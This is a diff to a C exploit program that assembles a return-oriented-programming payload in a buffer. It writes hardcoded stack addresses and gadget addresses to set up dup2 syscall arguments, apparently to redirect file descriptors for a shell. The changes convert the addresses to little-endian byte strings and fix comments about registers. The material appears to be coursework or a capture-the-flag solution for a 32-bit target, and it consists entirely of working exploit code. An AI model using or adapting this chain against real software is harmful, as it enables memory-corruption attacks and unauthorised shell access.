@@ -70,14 +70,14 @@ int main(void)
   // dup2 syscalls
   char dup_arg_seed[] = "\x62\x01\x01\x01";
   // #1 
-  char dup_call_3_addr[] = "BFBF 68F8"; // bufr + 475
-  char dup_call_arg_addr[] = "BFBF 68FC"; // bufr + 479
+  char dup_call_3_addr[] = "\xf8\x68\xbf\xbf"; // bufr + 475, BFBF 68F8
+  char dup_call_arg_addr[] = "\xfc\x68\xbf\xbf"; // bufr + 479, BFBF 68FC
   // #2
-  char dup_call2_3_addr[] = "BFBF 6908"; //bufr + 491
-  char dup_call2_arg_addr[] = "BFBF 690C"; //bufr + 495
+  char dup_call2_3_addr[] = "\x08\x69\xbf\xbf"; //bufr + 491, BFBF 6908
+  char dup_call2_arg_addr[] = "\x0C\x69\xbf\xbf"; //bufr + 495, BFBF 690C
   // #3
-  char dup_call3_3_addr[] = "BFBF 6918"; // bufr + 507
-  char dup_call3_arg_addr[] = "BFBF 691C"; // bufr + 511
+  char dup_call3_3_addr[] = "\x18\x69\xbf\xbf"; // bufr + 507, BFBF 6918
+  char dup_call3_arg_addr[] = "\x1c\x69\xbf\xbf"; // bufr + 511, BFBF 691C
 
 
   int i;
@@ -211,18 +211,18 @@ int main(void)
                                 // eax should hold 98, 0x62
   // put porper args into all stack args
   // get null into edx
-  strcpy(bufr + 403, xor_edx); // 0xbbb3bed4, ecx has 0
+  strcpy(bufr + 403, xor_edx); // 0xbbb3bed4, edx has 0
   // pop off first arg address into ecx
   strcpy(bufr + 407, pop_ecx);  // 0xbbaa422
   strcpy(bufr + 411, dup_call_arg_addr);
   strcpy(bufr + 415, write_at_ecx_from_edx);
   // pop off second arg address into ecx
-  strcpy(bufr + 419, inc_edx); // ecx has 1
+  strcpy(bufr + 419, inc_edx); // edx has 1
   strcpy(bufr + 423, pop_ecx); // 0xbbaa422
   strcpy(bufr + 427, dup_call2_arg_addr);
   strcpy(bufr + 431, write_at_ecx_from_edx); // 0xbbb6b87e
   // pop off third arg address into ecx
-  strcpy(bufr + 435, inc_edx); // ecx has 2
+  strcpy(bufr + 435, inc_edx); // edx has 2
   strcpy(bufr + 439, pop_ecx); // 0xbbaa422
   strcpy(bufr + 443, dup_call3_arg_addr);
   strcpy(bufr + 447, write_at_ecx_from_edx); // 0xbbb6b87e
